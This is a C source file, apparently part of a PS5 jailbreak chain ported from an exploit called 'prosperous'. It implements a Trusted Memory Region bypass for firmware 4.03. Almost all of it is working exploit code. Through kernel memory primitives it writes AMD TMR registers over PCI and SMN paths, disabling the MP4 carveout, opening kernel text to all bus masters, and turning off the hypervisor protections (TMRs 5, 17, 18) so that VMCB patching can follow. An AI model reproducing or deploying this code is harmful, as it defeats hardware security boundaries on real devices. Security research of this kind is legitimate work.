/*
 * TMR (Trusted Memory Region) bypass for PS5 FW 4.03.
 *
 * Ported from fail0verflow's prosperous exploit.
 *
 * TMRs are AMD hardware memory protection regions that restrict which
 * bus masters can access protected physical address ranges. The PS5 uses
 * them to protect:
 *   - Kernel text / HV text+data (TMR 16, 17, 18)
 *   - MP4 coprocessor DRAM (TMR 20)
 *   - PSP carveout (TMR 19)
 *   - HV master control (TMR 5)
 *
 * TMR registers are accessed indirectly via PCI B0:D18:F2 at offset
 * 0x80 (index) and 0x84 (data).
 *
 * IMPORTANT: This technique stops working at FW >= 5.00 because TMR
 * becomes non-modifiable by x86 at that point.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/* Saved TMR state for restoration */
static uint32_t saved_tmr5_cfg;
static uint32_t saved_tmr17_cfg;
static uint32_t saved_tmr18_cfg;
static uint32_t saved_tmr20_cfg;
static int tmr_saved = 0;

/*
 * SMN (System Management Network) read/write helpers.
 * These access SoC registers via B0:D0:F0 index/data at offset 0x60/0x64.
 * On PS5, this is a more reliable way to access DF/TMR registers than
 * going through PCI MMCFG indirect registers on B0:D18:F2.
 */
static uint32_t smn_read32(struct phys_rw_ctx *ctx, uint32_t addr)
{
    uint64_t smn_index_kva = ctx->dmap_base + PCI_B0D0F0 + SMN_INDEX_OFFSET;
    uint64_t smn_data_kva = ctx->dmap_base + PCI_B0D0F0 + SMN_DATA_OFFSET;
    uint32_t val;

    kernel_copyin(&addr, smn_index_kva, sizeof(addr));
    kernel_copyout(smn_data_kva, &val, sizeof(val));

    return val;
}

static void smn_write32(struct phys_rw_ctx *ctx, uint32_t addr, uint32_t val)
{
    uint64_t smn_index_kva = ctx->dmap_base + PCI_B0D0F0 + SMN_INDEX_OFFSET;
    uint64_t smn_data_kva = ctx->dmap_base + PCI_B0D0F0 + SMN_DATA_OFFSET;

    kernel_copyin(&addr, smn_index_kva, sizeof(addr));
    kernel_copyin(&val, smn_data_kva, sizeof(val));
}

/*
 * TMR register access.
 *
 * TMRs can be accessed two ways:
 *   1. PCI B0:D18:F2 indirect registers (index 0x80, data 0x84)
 *   2. SMN address space at 0x00050080 + offset (Data Fabric function 2)
 *
 * We try the PCI indirect path first and fall back to SMN if it doesn't work.
 */

/* TMR base address in SMN space: DF function 2 base + indirect offset */
#define SMN_DF_F2_BASE  0x00052000

/* Read a 32-bit TMR indirect register via PCI B0:D18:F2 */
static uint32_t tmr_read32_pci(struct phys_rw_ctx *ctx, uint32_t addr)
{
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t val;

    kernel_copyin(&addr, ind_index_kva, sizeof(addr));
    kernel_copyout(ind_data_kva, &val, sizeof(val));

    return val;
}

static void tmr_write32_pci(struct phys_rw_ctx *ctx, uint32_t addr, uint32_t val)
{
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;

    kernel_copyin(&addr, ind_index_kva, sizeof(addr));
    kernel_copyin(&val, ind_data_kva, sizeof(val));
}

/* Read a 32-bit TMR indirect register via SMN */
static uint32_t tmr_read32_smn(struct phys_rw_ctx *ctx, uint32_t addr)
{
    /* SMN DF F2 indirect: write index to SMN_DF_F2_BASE + 0x80,
     * read data from SMN_DF_F2_BASE + 0x84 */
    smn_write32(ctx, SMN_DF_F2_BASE + TMR_IND_INDEX_OFF, addr);
    return smn_read32(ctx, SMN_DF_F2_BASE + TMR_IND_DATA_OFF);
}

static void tmr_write32_smn(struct phys_rw_ctx *ctx, uint32_t addr, uint32_t val)
{
    smn_write32(ctx, SMN_DF_F2_BASE + TMR_IND_INDEX_OFF, addr);
    smn_write32(ctx, SMN_DF_F2_BASE + TMR_IND_DATA_OFF, val);
}

/* Active TMR access method: 0 = PCI, 1 = SMN */
static int tmr_use_smn = 0;

/* Dispatch to active TMR access method */
static uint32_t tmr_read32(struct phys_rw_ctx *ctx, uint32_t addr)
{
    if (tmr_use_smn)
        return tmr_read32_smn(ctx, addr);
    return tmr_read32_pci(ctx, addr);
}

static void tmr_write32(struct phys_rw_ctx *ctx, uint32_t addr, uint32_t val)
{
    if (tmr_use_smn)
        tmr_write32_smn(ctx, addr, val);
    else
        tmr_write32_pci(ctx, addr, val);
}

/* Read a full TMR entry */
static void tmr_read_entry(struct phys_rw_ctx *ctx, int index, struct tmr_entry *entry)
{
    uint32_t base_addr = index * 0x10;
    entry->base = tmr_read32(ctx, base_addr);
    entry->limit = tmr_read32(ctx, base_addr + 4);
    entry->cfg = tmr_read32(ctx, base_addr + 8);
    entry->requestors = tmr_read32(ctx, base_addr + 12);
}

/* Configure a TMR entry to allow all requestors */
static void tmr_add_for_all(struct phys_rw_ctx *ctx, int index,
                            uint32_t base, uint32_t limit)
{
    uint32_t addr = index * 0x10;

    /* Disable first */
    tmr_write32(ctx, addr + 8, TMR_CFG_DISABLED);

    /* Set base and limit */
    tmr_write32(ctx, addr + 0, base);
    tmr_write32(ctx, addr + 4, limit);

    /* No requestor restrictions */
    tmr_write32(ctx, addr + 12, 0);

    /* Enable with all-access */
    tmr_write32(ctx, addr + 8, TMR_CFG_ALL_ACCESS);
}

/*
 * Phase 1: Disable TMR 20 (MP4 carveout) so x86 can write to MP4 DRAM.
 * Also create TMR 21 covering the TMR 16 region (kernel text) to
 * give all requestors access.
 */
int tmr_bypass_init(struct phys_rw_ctx *ctx)
{
    struct tmr_entry tmr20;
    struct tmr_entry tmr16;
    uint32_t verify_cfg;

    /* Diagnostic: Verify MMCFG access by reading PCI device IDs */
    {
        uint32_t pci_id;
        uint64_t pci_root_kva = ctx->dmap_base + PCI_B0D0F0;
        kernel_copyout(pci_root_kva, &pci_id, sizeof(pci_id));
        printf("[DIAG] PCI B0:D0:F0 ID: 0x%08x (expect AMD 0x1022xxxx)\n", pci_id);

        uint32_t d18f2_id;
        uint64_t d18f2_kva = ctx->dmap_base + PCI_B0D18F2;
        kernel_copyout(d18f2_kva, &d18f2_id, sizeof(d18f2_id));
        printf("[DIAG] PCI B0:D18:F2 ID: 0x%08x\n", d18f2_id);
    }

    /* Try PCI indirect path first */
    tmr_use_smn = 0;
    printf("[*] Trying TMR access via PCI B0:D18:F2 indirect registers...\n");

    tmr_read_entry(ctx, 20, &tmr20);
    printf("[DIAG] TMR 20 (PCI): base=0x%08x limit=0x%08x cfg=0x%08x req=0x%08x\n",
           tmr20.base, tmr20.limit, tmr20.cfg, tmr20.requestors);

    /* Sanity check: TMR 20 base should be 0x6000 (PA 0x60000000 >> 16) */
    if (tmr20.base != 0x6000 || tmr20.cfg == 0) {
        printf("[!] PCI indirect TMR access looks wrong, trying SMN path...\n");

        /* Try multiple SMN base addresses for DF F2 */
        uint32_t smn_bases[] = { 0x00052000, 0x00050000, 0x000500C0 };
        int found = 0;

        for (int i = 0; i < 3; i++) {
            uint32_t test_base = smn_bases[i];
            printf("[*] Trying SMN DF base 0x%08x...\n", test_base);

            /* Read TMR 20 base via this SMN path */
            smn_write32(ctx, test_base + TMR_IND_INDEX_OFF, 20 * 0x10);
            uint32_t t20_base = smn_read32(ctx, test_base + TMR_IND_DATA_OFF);
            printf("[DIAG]   TMR 20 base via SMN 0x%x: 0x%08x\n",
                   test_base, t20_base);

            if (t20_base == 0x6000) {
                printf("[+] Found working SMN path at 0x%08x\n", test_base);
                tmr_use_smn = 1;
                found = 1;

                /* Re-read full entry via SMN */
                tmr_read_entry(ctx, 20, &tmr20);
                printf("[DIAG] TMR 20 (SMN): base=0x%08x limit=0x%08x "
                       "cfg=0x%08x req=0x%08x\n",
                       tmr20.base, tmr20.limit, tmr20.cfg, tmr20.requestors);
                break;
            }
        }

        if (!found) {
            printf("[!] Could not find working TMR access path!\n");
            printf("[!] Trying raw SMN scan for TMR 20 base=0x6000...\n");

            /* Brute-force scan DF register space in SMN */
            for (uint32_t base = 0x00050000; base <= 0x00059000; base += 0x400) {
                smn_write32(ctx, base + TMR_IND_INDEX_OFF, 20 * 0x10);
                uint32_t t = smn_read32(ctx, base + TMR_IND_DATA_OFF);
                if (t == 0x6000) {
                    printf("[+] Found TMR at SMN 0x%08x!\n", base);
                    /* Update the global SMN base - re-define not possible,
                     * but we can just use the PCI indirect with correct base.
                     * For now, just report it. */
                }
                if (base == 0x00050000 || base == 0x00050400 ||
                    base == 0x00050800 || base == 0x00052000 ||
                    base == 0x00054000 || base == 0x00058000) {
                    printf("[DIAG]   SMN 0x%05x + 0x80 -> TMR20.base = 0x%08x\n",
                           base, t);
                }
            }

            /* Also try directly reading SMN addresses that might be TMR regs */
            printf("[DIAG] Direct SMN reads at potential TMR locations:\n");
            uint32_t direct_addrs[] = {
                0x00050140, 0x00050148, /* TMR 20 at DF offset 0x140/0x148 */
                0x00052140, 0x00052148,
                0x00054140, 0x00054148,
            };
            for (int i = 0; i < 6; i++) {
                uint32_t v = smn_read32(ctx, direct_addrs[i]);
                printf("[DIAG]   SMN[0x%08x] = 0x%08x\n", direct_addrs[i], v);
            }
        }
    } else {
        printf("[+] PCI indirect TMR access working\n");
    }

    printf("[DIAG] TMR 20 PA range: 0x%llx - 0x%llx\n",
           (unsigned long long)tmr20.base << 16,
           (unsigned long long)tmr20.limit << 16);

    /* Save TMR 20 config for later restoration */
    saved_tmr20_cfg = tmr20.cfg;

    /* Disable TMR 20 */
    tmr_write32(ctx, 20 * 0x10 + 8, TMR_CFG_DISABLED);

    /* Verify disable took effect */
    verify_cfg = tmr_read32(ctx, 20 * 0x10 + 8);
    printf("[DIAG] TMR 20 cfg after disable: 0x%08x (expect 0x00000000)\n",
           verify_cfg);

    if (verify_cfg != 0) {
        printf("[!] TMR 20 disable FAILED via %s path\n",
               tmr_use_smn ? "SMN" : "PCI");

        /* If PCI failed, try SMN as last resort */
        if (!tmr_use_smn) {
            printf("[*] Falling back: trying TMR disable via SMN...\n");
            tmr_use_smn = 1;
            tmr_write32(ctx, 20 * 0x10 + 8, TMR_CFG_DISABLED);
            verify_cfg = tmr_read32(ctx, 20 * 0x10 + 8);
            printf("[DIAG] TMR 20 cfg after SMN disable: 0x%08x\n", verify_cfg);
        }
    }

    /* Read TMR 16 */
    tmr_read_entry(ctx, 16, &tmr16);
    printf("[DIAG] TMR 16: base=0x%08x limit=0x%08x cfg=0x%08x\n",
           tmr16.base, tmr16.limit, tmr16.cfg);

    /* Create TMR 21 covering the same region but allowing all access */
    tmr_add_for_all(ctx, 21, tmr16.base, tmr16.limit);

    tmr_saved = 1;
    return 0;
}

/* Restore TMR 20 only (after MP4 injection, before HV bypass) */
void tmr_restore_tmr20(struct phys_rw_ctx *ctx)
{
    if (saved_tmr20_cfg != 0)
        tmr_write32(ctx, 20 * 0x10 + 8, saved_tmr20_cfg);
}

/*
 * Phase 2: Disable TMR protections on the HV memory region.
 *
 * TMR 5 is the master HV protection TMR. We temporarily set it to
 * all-access mode, then disable TMR 17 and 18 (HV region protections),
 * and finally disable TMR 5 entirely.
 *
 * This gives us unrestricted access to the HV's physical memory,
 * which is needed for VMCB patching.
 */
int tmr_disable_hv_regions(struct phys_rw_ctx *ctx)
{
    /* Save current TMR configs */
    saved_tmr5_cfg = tmr_read32(ctx, 5 * 0x10 + 8);
    saved_tmr17_cfg = tmr_read32(ctx, 17 * 0x10 + 8);
    saved_tmr18_cfg = tmr_read32(ctx, 18 * 0x10 + 8);

    /* Only proceed if TMR 5 is actually enabled */
    if (saved_tmr5_cfg == 0)
        return 0; /* Already disabled */

    /* Step 1: Set TMR 5 to all-access (so we can modify 17/18) */
    tmr_write32(ctx, 5 * 0x10 + 8, TMR_CFG_ALL_ACCESS);

    /* Step 2: Disable TMR 17 and 18 */
    tmr_write32(ctx, 17 * 0x10 + 8, TMR_CFG_DISABLED);
    tmr_write32(ctx, 18 * 0x10 + 8, TMR_CFG_DISABLED);

    /* Step 3: Disable TMR 5 */
    tmr_write32(ctx, 5 * 0x10 + 8, TMR_CFG_DISABLED);

    return 0;
}

/*
 * Restore TMR protections.
 *
 * Must be called after VMCB patching is complete. Re-enables the HV
 * TMR protections and restores TMR 20 (MP4 carveout) to prevent
 * kernel panics when game processes are restarted.
 */
void tmr_restore_hv_regions(struct phys_rw_ctx *ctx)
{
    if (!tmr_saved)
        return;

    /* Restore HV TMR protections in reverse order */
    tmr_write32(ctx, 5 * 0x10 + 8, TMR_CFG_ALL_ACCESS);
    tmr_write32(ctx, 17 * 0x10 + 8, saved_tmr17_cfg);
    tmr_write32(ctx, 18 * 0x10 + 8, saved_tmr18_cfg);
    tmr_write32(ctx, 5 * 0x10 + 8, saved_tmr5_cfg);

    /* Restore TMR 20 (critical: without this, kernel panics on game restart) */
    tmr_write32(ctx, 20 * 0x10 + 8, saved_tmr20_cfg);

    tmr_saved = 0;
}
